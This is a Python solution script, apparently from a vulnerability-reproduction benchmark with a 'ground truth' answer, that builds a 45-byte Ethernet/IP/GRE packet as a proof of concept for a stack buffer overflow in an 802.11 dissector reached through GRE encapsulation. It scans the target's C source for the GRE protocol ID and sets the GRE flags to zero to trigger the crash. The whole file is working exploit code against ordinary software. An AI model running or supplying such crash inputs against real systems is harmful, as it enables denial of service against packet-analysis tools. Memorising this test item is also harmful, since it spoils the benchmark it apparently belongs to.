import os
import re
import struct
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in the 802.11 dissector
        via GRE encapsulation.
        
        Strategies:
        1. Scan the source code to find the GRE protocol type ID that maps to the 802.11 dissector.
        2. Construct a valid Ethernet + IP + GRE packet.
        3. Set the GRE protocol type to the found ID.
        4. Set GRE flags/version to 0 (which is passed as 'data' pointer to 802.11 dissector, causing stack issue).
        5. Return the raw packet bytes.
        """
        
        defines = {}
        candidates = []
        
        # Regex to capture #define definitions
        re_define = re.compile(r'^\s*#\s*define\s+([A-Za-z0-9_]+)\s+(0x[0-9a-fA-F]+|\d+)')
        # Regex to capture dissector_add_uint("gre.proto", <id>, <handle>)
        re_gre_add = re.compile(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([A-Za-z0-9_]+)\s*,\s*([A-Za-z0-9_]+)\s*\)')

        def process_content(content):
            for line in content.splitlines():
                # Extract defines
                m_def = re_define.search(line)
                if m_def:
                    name, val = m_def.groups()
                    try:
                        defines[name] = int(val, 0)
                    except ValueError:
                        pass
                
                # Extract gre.proto registrations
                m_add = re_gre_add.search(line)
                if m_add:
                    pid, handle = m_add.groups()
                    candidates.append((pid, handle))

        # Scan the source tarball or directory
        if os.path.isfile(src_path) and any(src_path.endswith(ext) for ext in ['.tar.gz', '.tgz', '.tar']):
            try:
                with tarfile.open(src_path, 'r:*') as tar:
                    for member in tar.getmembers():
                        if member.isfile() and member.name.endswith(('.c', '.h')):
                            try:
                                f = tar.extractfile(member)
                                if f:
                                    content = f.read().decode('utf-8', errors='ignore')
                                    process_content(content)
                            except Exception:
                                pass
            except Exception:
                pass
        elif os.path.isdir(src_path):
            for root, dirs, files in os.walk(src_path):
                for file in files:
                    if file.endswith(('.c', '.h')):
                        try:
                            with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                process_content(f.read())
                        except Exception:
                            pass

        # Resolve the GRE protocol ID for 802.11
        target_id = 0x88B7  # Fallback: ETHERTYPE_IEEE_802_11 common value
        found = False
        
        # Look for handles containing 'wlan' or '80211'
        for pid_str, handle_str in candidates:
            if 'wlan' in handle_str.lower() or '80211' in handle_str.lower():
                val = None
                if pid_str.startswith('0') or pid_str.isdigit():
                    try:
                        val = int(pid_str, 0)
                    except ValueError:
                        pass
                elif pid_str in defines:
                    val = defines[pid_str]
                
                if val is not None:
                    target_id = val
                    found = True
                    break
        
        # Fallback check for known constant name
        if not found and "ETHERTYPE_IEEE_802_11" in defines:
            target_id = defines["ETHERTYPE_IEEE_802_11"]

        # Construct Packet
        # Length aim: 45 bytes (matches ground truth)
        # Ethernet (14) + IP (20) + GRE (4) + Payload (7) = 45 bytes
        
        # 1. Ethernet Header (14 bytes)
        # Dst MAC (6), Src MAC (6), EtherType (2)
        eth = struct.pack("!6s6sH", b'\x00'*6, b'\x00'*6, 0x0800) # IP
        
        # 2. IP Header (20 bytes)
        payload_len = 7
        total_ip_len = 20 + 4 + payload_len
        
        # Calculate checksum
        # Structure: VerIHL(1), TOS(1), TotalLen(2), ID(2), FlagsFrag(2), TTL(1), Proto(1), Checksum(2), Src(4), Dst(4)
        ip_header_temp = struct.pack("!BBHHHBBH4s4s", 
                                     0x45, 0, total_ip_len, 0, 0, 64, 47, 0, 
                                     b'\x7f\x00\x00\x01', b'\x7f\x00\x00\x01')
        
        s = 0
        for i in range(0, len(ip_header_temp), 2):
            w = (ip_header_temp[i] << 8) + ip_header_temp[i+1]
            s += w
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        chk = ~s & 0xffff
        
        ip = struct.pack("!BBHHHBBH4s4s", 
                         0x45, 0, total_ip_len, 0, 0, 64, 47, chk, 
                         b'\x7f\x00\x00\x01', b'\x7f\x00\x00\x01')
        
        # 3. GRE Header (4 bytes)
        # Flags/Version (2 bytes) = 0x0000. 
        #   This value (0) is passed as the 'data' pointer to the 802.11 dissector.
        #   The 802.11 dissector treats it as a pointer to a larger pseudoheader struct.
        #   Reading/writing based on this usually triggers the crash.
        # Protocol (2 bytes) = target_id (Triggers 802.11 dissector)
        gre = struct.pack("!HH", 0x0000, target_id)
        
        # 4. Payload (7 bytes)
        payload = b'\x00' * payload_len
        
        return eth + ip + gre + payload
